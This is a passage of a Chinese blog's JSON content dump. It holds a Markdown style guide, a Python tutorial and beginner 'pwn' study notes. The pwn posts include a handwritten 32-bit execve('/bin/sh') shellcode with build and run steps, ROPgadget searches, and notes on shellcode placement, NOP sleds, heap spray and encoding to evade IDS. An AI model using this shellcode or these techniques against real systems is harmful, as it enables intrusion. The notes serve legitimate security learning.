格式规范标题结构格式1.标题与紧贴的’上下正文‘使用’1整行换行‘隔开2.’#’号和文字之间’一个空格’连接3.标题层级最多六级 ‘#’到’######’ 加强和强调规范一般统一使用第一种 12*emphasize*_emphasize_ 使用’~~’给文字添加删除线1~~strikethrough~~ 代码块规范 行内代码使用’一对波浪号’如：hello world! 块级代码使用’三个波浪号’或’整体四空格缩进’，且上下均用整行隔开，如下： 123&lt;?php echo &apos;看源码之三个波浪号&apos;;?&gt; &lt;?php echo &apos;看源码之四空格缩进&apos;; ?&gt; 列表写法 列号’1.’或者’*’后内容用空格隔开 列表块前后’整行隔开’ 如下： 1234561. Windows 2. Mac3. iOS * iPhone * iPad4. Android 实际预览： Windows Mac iOS iPhone iPad Android 123456* Windows * Mac* iOS* Android 1. v3.2 2. v4.1 实际预览： Windows Mac iOS Android v3.2 v4.1 其他标签规范链接和email Inline： 1An [example](http://url.com/ &quot;title&quot;) 实现效果：An example 引用样式标签（titles are optional）: An [example][id].Then,anywhere else in the doc,define the link: [id]:http://example.com/ &quot;title&quot; Email: 1An email &lt;example@example.com&gt; link. 插图Inline(titles are optional)： 1![alt text](/path/img.jpg &quot;title&quot;) 引用式插图： ![alt text][id] [id]:/url/to/img.jpg &quot;title&quot; 引用块及嵌套 Email-style angle bracketsare used for blockquotes. And, they can be nested. Headers in blockquotes You can quote a list. Etc. 内联代码 &lt;code&gt; 段落中的用法 也可以 `代码中包含波浪号`.代码块 Indent every line of a code block by at least 4 spaces or 1 tab.代码的每行都最少用4个空格或者一个制表符(tab) 我是普通文本块 我是一个预格式化的 代码块. 水平分割线三个连字符-: 表格规范一个简单的表格看起来如下： 第一个头部 第二个头部 第三个头部 内容格子 内容格子 内容格子 内容格子 内容格子 内容格子 每列的对齐可以通过在分割线上添加冒号来实现： 第一个头部 第二个头部 第三个头部 左对齐 居中 右对齐 左对齐 居中 右对齐 页内锚标记 点我跳转到顶部 // 利用 #,## 生成 id 锚标签 另一种锚标记 // 利用 &lt;a name=&quot;top&quot;&gt;&lt;/a&gt; 附：参考 Hello-World.md 源码，注意换行的使用 123456789101112131415# Hello-World这是一个范例文件格式我是普通换行## 我是&lt;h2&gt;标题我是`&lt;h2&gt;`的内容## 我是&lt;h3&gt;标题* Windows * Mac* iOS* Android","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"Introduction to pwn1.1","slug":"pwn-入门1-1","date":"2018-08-13T14:35:13.000Z","updated":"2018-09-29T09:15:02.590Z","comments":true,"path":"2018/08/13/pwn-入门1-1/","link":"","permalink":"http://siriuswhiter.tk/2018/08/13/pwn-入门1-1/","excerpt":"","text":"各种变量的存储位置 stack：局部变量 heap: 动态分配内存的变量（malloc/new） bss section: 全局化的未初始化的变量 data section: 全局化的已初始化的变量 rodata: （只读data段）全局化的静态变量（const） 例如： 123456789int a = 0; //.dataint b; //.bssconst double PI = 3.1415 //rodataint main()&#123; int c = 2; //stack char *d = malloc(16); //heap return 0;&#125; linux下将shellcode运行1.手写简易shellcode 123456789101112jmp shrun: pop ebx mov BYTE [ebx+7],0 xor eax,eax mov al,11 xor ecx,ecx xor edx,edx int 0x80sh: call run db &quot;/bin/sh&quot; 2.一系列步骤 123Assembly: nasm a.asm -o a.o -felf32 Extract Shellcode: objcopy -O binary a.o code //将a.o中需要用内容的提取到code中 xxd -i code //将提取出来的code转换为机器码 3.带入调用shellcode的程序test.c #include &quot;code.h&quot; typedef int(*CODE)(); int main() { ((CODE)shellcode)(); } Run Shellcode: gcc test.c -o test -m32 -zexexstack linux下的系统调用. 之前的一些小知识点笔记：gadget :一小段以ret结尾的code rop chain ：串联在一起的gadget rop 类型：控制寄存器做syscall；使用原有程序的func；使用libc里的gadget或func（绕过ASLR）. rop关键： 查找gadget： ROPgadget --binary ./file ROPgadget --binary ret2syscall --only &apos;pop|ret&apos; | grep eax ROPgadget --binary --opcode cd80c3（int 0x80 ; ret ） 排列gadget： peda：vmmap 查看程序段的可读写执行情况 也可以：./file &amp; (后台运行，返回pid0） cat /proc/pid0/maps","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Learning python","slug":"learning-python","date":"2018-08-02T11:11:04.000Z","updated":"2018-09-25T13:43:58.748Z","comments":true,"path":"2018/08/02/learning-python/","link":"","permalink":"http://siriuswhiter.tk/2018/08/02/learning-python/","excerpt":"","text":"最近将之前的博客逐渐搬运过来，因为可怜的服务器要到期了hhh 为了能够完成各色python脚本的编写，迫不得已入门python大法！ 以下为简易的py语法： Python string 对于单个字符的编码，Python提供了ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符； eg： ord(‘A’) -&gt;65 chr(66) -&gt;B 对bytes类型的数据用带b前缀的单引号或双引号表示： x=b’abc’； 可以通过encode() 将Unicode表示的str编码为指定的 bytes； 格式化输出字符串： c语言格式； format 方法’aaaa{0}bbbb{1}cccccc……’.format(para1,para2…)参数会依次取代占位符{0} {1}{…}； python list and tuple list（列表） ：classmates = [‘elementl’, ‘element2’, [‘element31’,’element32’],’element4’] len()得到元素个数； classmates[-n]可以得到倒数第n个元素； classmates.append(‘element’)追加元素到末尾； insert(n,’element’)插入到指定位置； pop()删除末尾元素；pop(i)删除指定位置元素； classmates[n]=’element’直接替换为别的元素； list元素可以是另一个list。 tuple（元组）： classmates = (‘elementl’, ‘element2’, (‘element31’,’element32’),’element4’) 一旦初始化就不能修改（每个元素指向不变），一定程度上相当于const； 获取元素方法与list相同； 当只有一个元素时 t=(1,) 需要使用’，’来消除歧义； tuple中包含list元素时，list中的元素可以变，因为对tuple来说其指向并没有改变。 python dic （同c++map） d = {‘key1’: value1, ‘key2’: value2, ‘key3’: value3} =&gt; d[‘key1’] -&gt;value1 为避免key不存在： ‘key’ in d 不存在则返回False； d.get(‘key’,value) 不存在则返回value； pop(key)可以删除key即对应的value。 python set set也是一组key的集合但不储存value；key不能重复。 创建set需要提供一个list作为输入集合 s = set([1,2,3]); add(key)添加key ；remove(key)删除key。 1234567891011和list比较，dict有以下几个特点： 查找和插入的速度极快，不会随着key的增加而变慢； 需要占用大量的内存，内存浪费多。而list相反： 查找和插入的时间随着元素的增加而增加； 占用空间小，浪费内存很少。所以，dict是用空间来换取时间的一种方法。 python loop for i in list/tuple: 把list或tuple中的每个元素带入i，执行之后缩进块的语句； range()函数可以生成一个整数序列，list(range(n))可以将其转化为list； while xxx： break / continue 同c。 python func 空函数：pass用来做占位符，让代码格式正确。 可以返回多个值，实质上是返回的tuple； None 为不变对象，需要时可以将函数的参数定义为不变对象，这样在每次调用时都是从初始定义的变量开始。（即python函数参数变量默认等于c语言的static，加上none可以去掉static） 12345#Python2.7在一行输入多个数字的方法： 输入一个数字 m = int(raw_input())输入多个数字是 m, n,.... = map(int, raw_input().split()) 可变参数： 函数 def funcname(‘*’args):定义一个参数数量不定的list/tuple L, 调用funcname(L)即可； 关键字参数：函数def funcname(a,b,’‘’‘kw):c为关键字参数（例如用户注册 ab为必填项 c为选填项）；调用时funcname(A,B,e=E,f=F); 命名关键字参数：函数def funcname(a,b,’‘,c,d):’‘后面为命名关键字参数，即选填项只能是定义的key；也可以是 def funcname(a,b,’‘,c,d，e):可变参数c后面的命名关键字参数不必再加’*’；对于前者，调用时funcname(A,B,c=C,d=D); python slice用于取一个list或tuple的部分元素:L = [‘element1’, ‘element2’, ‘element3’, ‘element4’, ‘element5’] slice操作符使用： eg：取前三个元素 L[0:3] /L[:3]；取后两个元素L[-2:]；取倒数第二个元素L[-2:-1]； L[:10:2]前十个数里每两个取一个；L[::5]所有数每五个取一个； python iteration即循环遍历； d = {‘a’: 1, ‘b’: 2, ‘c’: 3} eg: 循环迭代dict： for key in d://默认dict 迭代的是key ；迭代value : for value in d.values()；同时迭代 ：for k,v ind.items() 判断是否可迭代：通过collections模块的Iterable类型判断 12 from collections import Iterable isinstance(objects,Iterable) 下标循环的实现：通过内置的enumerate函数判断 1for i, value in enumerate([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]): python list generationeg： 生成L=[1,4,9,….100]：[x*x for x in range(1,100)]; 筛选出仅偶数的平方：[x*x for x in range(1,100) if x%2 ==0]; 两层循环生成全排列：[m+n for m in &#39;ABC&#39; for n in &#39;DEF&#39; ]; 列出当前目录下所有文件即目录名：import os | [d for d in os.listdir(&#39;.&#39;)]; 把一个list L 中所有字符串变为小写：[s.lower() for s in L]; python genarator不必创建完整的list，节省大量空间；边循环边计算，称为生成器generator； 方法：将列表生成式的[]改为()即可；","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"The art 0f deploying shellcode","slug":"the-art-0f-deploying-shellcode","date":"2018-07-26T11:46:22.000Z","updated":"2018-09-25T13:43:49.802Z","comments":true,"path":"2018/07/26/the-art-0f-deploying-shellcode/","link":"","permalink":"http://siriuswhiter.tk/2018/07/26/the-art-0f-deploying-shellcode/","excerpt":"","text":"转移自之前的博客 shellcode布置 将shellcode放在缓冲区中（静态地址），即函数返回地址之前。//shellcode自身可能会被压栈数据破坏，难以动态定位 1 使用jmp esp/call esp 指令作为跳板指令，定位shellcode，使shellcode正好布置在返回地址之后。//前栈帧数据被大范围破坏 2 为尽量避免1,2的缺点，可以使用跳转指令定位shellcode，同时将shellcode布置在缓冲区内。 3 为了使shellcode具有通用性/安全性，通常会在shellcode一开始大范围抬高栈顶，保护自身代码的完整性。 2 某些情况下不允许使用跳板指令，静态地址又不够准确。可以淹没大片内存的情况下，将shellcode布置在一大段nop之后。此时定位shellcode时，只要能够跳进一大片nop之中即可。 2 返回地址距离缓冲区偏移量不确定。若函数返回地址按双字节不定，可以用一片连续的跳转指令的地址来覆盖函数返回地址，只要有其中一个可以成功覆盖，shellcode就能执行。（待理解） 2 按字节错位引起定位失败从而使shellcode无效。使用按字节相同的双字跳转地址，甚至使用堆中的地址，将shellcode用堆扩展的方法放置在相应区域（Heap spray）。（待理解） 2 2 shellcode的编码技术 原因： 所有的字符串函数都会对NULL字节进行限制，通常需要在shellcode中选择特殊的指令避免直接出现NULL字节或字。 有些函数还会要求shellcode必须为可见字符的ASCII值或Unicode值。 基于特征的IDS系统往往会对常见的shellcode进行拦截。 2 2 解决： 编码。先编码使内容达到限制的要求，再构造解码程序放在shellcode开始执行的地方。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]},{"title":"Introduction to pwn0.0 --Protection technology","slug":"protection-technology","date":"2018-05-13T12:11:03.000Z","updated":"2018-09-25T13:42:56.132Z","comments":true,"path":"2018/05/13/protection-technology/","link":"","permalink":"http://siriuswhiter.tk/2018/05/13/protection-technology/","excerpt":"","text":"转移自之前的博客 NX保护和DEP保护两个保护措施都有相同点，都是使数据与代码分离，防止恶意代码被执行简单来说就是关闭了堆栈执行权限 NX保护NX保护，全称为 “No eXecute” ，意为 [禁止执行]我对它的理解即为栈上数据区域去除执行权限，就能防止大多数溢出攻击，即一些恶意程式，把自身的恶意指令集放在其他程式的数据储存区并执行。 linux最早的漏洞防护机制nx-stack刚刚出现后就有人想出了突破方法。那就是只有栈是不可执行，而除了栈以外的其他地方还是可以执行的，只要把返回地址执行别的地方就可以。 DEP保护DEP保护，全称为 Data Execution Prevention ，意为 数据执行保护 数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码 主要优点我觉得这种保护技术组要应用于Windows 这种技术的保护方式和NX方式有相同的地方，也就是让堆和堆栈上的内容不可执行。 可帮助防止数据页当作代码执行，从而有效分离数据与代码。可写的不可执行，可执行的不可写。百度百科上有这样一句话： 可以说，溢出是操作系统(应用软件)永远的痛，Windows 7自然也不例外。所谓溢出主要指缓冲区溢出，就是利用系统(应用软件)漏洞从只有Windows和其他程序可以使用的内存位置执行恶意代码从而达到控制系统的目的。如前所述，缓冲区溢出攻击经常在其它程序的内存缓冲区写入可执行的恶意代码，然后诱骗程序执行恶意代码。使用DEP的目的是阻止恶意插入代码的执行，其运行机制是，Windows利用DEP标记只包含数据的内存位置为非可执行(NX)，当应用程序试图从标记为NX的内存位置执行代码时，Windows的DEP逻辑将阻止应用程序这样做，从而达到保护系统防止溢出。 *P.S.好像这部分还分为硬件实施DEP和软件实施DEP，这个坑先留着吧，过些日子理解之后我再来填。 Linux Canary保护Canary ，又名 金丝雀 ，是一个防止溢出修改ret的措施， Canary 是Linux众多安全保护机制中的一种，主要用于 防护栈溢出攻击 。我们知道，在32位系统上，对于栈溢出漏洞，攻击者通常是通过 溢出栈缓冲区 ， 覆盖栈上保存的函数返回地址 来达到 劫持程序执行流 的目的：溢出栈缓冲区劫持方式 1 如上图所示我们只要能够精确计算出需要覆盖的长度是多少，就能精确覆盖ret的地址，达到攻击效果。然而，针对此种攻击情况，如果在函数返回之前，我们能够判断ret地址是否被改写，若被改写则终止程序的执行，便可以有效地应对攻击。如何做到呢？一个很自然的想法是在刚进入函数时，在栈上放置一个标志，在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生。 Linux Canary保护机制 便是如此，如下： 1 攻击者如果要通过栈溢出覆盖ret，则必先覆盖Canary。如果我们能判断Canary前后是否一致，便能够判断是否有攻击行为发生。 注：上述图例仅用于说明，实际上canary并不一定是与栈上保存的BP地址相邻的。 ASLR地址空间布局随机化ASLR ，全称为 Address space layout randomization顾名思义，这个保护措施的主要内容就是把地址给随机化了，用以增加攻击者对地址预测的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。 但是这个措施只是能降低缓冲区溢出攻击的成功率，并不是能完全防止溢出。 关于这个，多的我也说不上来，给几个文章的地址吧。 PIEPIE ，全称为 position-independent executables一般情况下NX和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作PIE。 内存地址随机化机制，有以下三种情况： 1234参数 意义0 表示关闭进程地址空间随机化1 表示将mmap的基址，stack和vdso页面随机化2 表示在1的基础上增加栈（heap）的随机化 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。 FORTIFY这个好像是编译器的保护措施，将函数名改变了，从而达到防止缓冲区溢出的作用。具体的坑emmm等我以后学会了些再来填吧。 系统防护（全）：二进制的保护机制WINDOWS和LINUX的内存防护机制","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]}]}